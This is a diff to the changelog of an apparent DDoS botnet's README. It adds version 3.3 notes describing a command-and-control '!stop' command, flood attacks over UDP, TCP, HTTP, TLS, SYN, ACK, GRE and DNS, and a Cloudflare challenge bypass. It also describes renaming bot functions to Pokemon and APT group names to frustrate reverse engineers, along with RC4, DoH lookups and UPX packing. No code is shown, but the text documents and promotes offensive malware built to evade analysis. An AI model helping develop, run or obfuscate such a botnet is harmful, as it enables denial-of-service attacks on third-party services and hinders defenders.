@@ -136,9 +136,26 @@ optional: protect UPX packed binaries from string analysis https://github.com/Sy
 
 ## 📋 Changelog
 
-### v3.2 - January 29, 2026
+### v3.3 - January 29, 2026
 
 #### 🚀 New Features
+
+- **Stop All Attacks** (`!stop`) - Instantly terminates all running attacks across all bots from CNC or per-bot
+- **Anti-Analysis Obfuscation** - All bot function names now use Pokemon & APT group names to confuse reverse engineers:
+  - Attack functions: `snorlax` (UDP), `gengar` (TCP), `alakazam` (HTTP), `machamp` (HTTPS), `gyarados` (CFBypass), `dragonite` (SYN), `tyranitar` (ACK), `metagross` (GRE), `salamence` (DNS)
+  - APT group names: `fancyBear`, `cozyBear`, `lazarus`, `turla`, `kimsuky`, `carbanak`, `fin7`, `dragonfly`, `winnti`, `scarcruft`, `gamaredon`, `mustangPanda`, `hafnium`, `charmingKitten`, `sidewinder`, `oceanLotus`, `machete`, `muddywater`, `emotet`, `trickbot`, `blackEnergy`, `anonymousSudan`
+  - Utility functions: `pikachu` (stop attacks), `raichu` (get stop channel), `lucario` (resolve target), `charizard` (derive key), `blastoise` (RC4), `venusaur` (decode), `darkrai` (DNS TXT), `palkia` (DoH lookup)
+
+#### 🔧 Bug Fixes
+
+- **Global attack stop channel** - Thread-safe stop mechanism using mutex-protected channel recreation
+- **Attack coordination** - All attack goroutines now listen on stop channel for instant termination
+- **Setup.py compatibility** - Updated regex patterns and comments to work with obfuscated function names (mew/mewtwo/celebi/jirachi)
+
+---
+
+
+#### Bot Updates  
 
 - **HTTPS/TLS Flood Attack** (`!https`, `!tls`) - High-performance TLS 1.3 flood with HTTP/2 fingerprinting, random SNI, and proper handshake completion
 - **Cloudflare Bypass Attack** (`!cfbypass`) - Bypasses Cloudflare UAM challenge with JavaScript execution simulation, cookie persistence, and proper browser fingerprinting
@@ -183,6 +200,7 @@ optional: protect UPX packed binaries from string analysis https://github.com/Sy
 - Basic telnet negotiation
 - Help menu alignment
 - Banner redesign
+
 
 ---
 
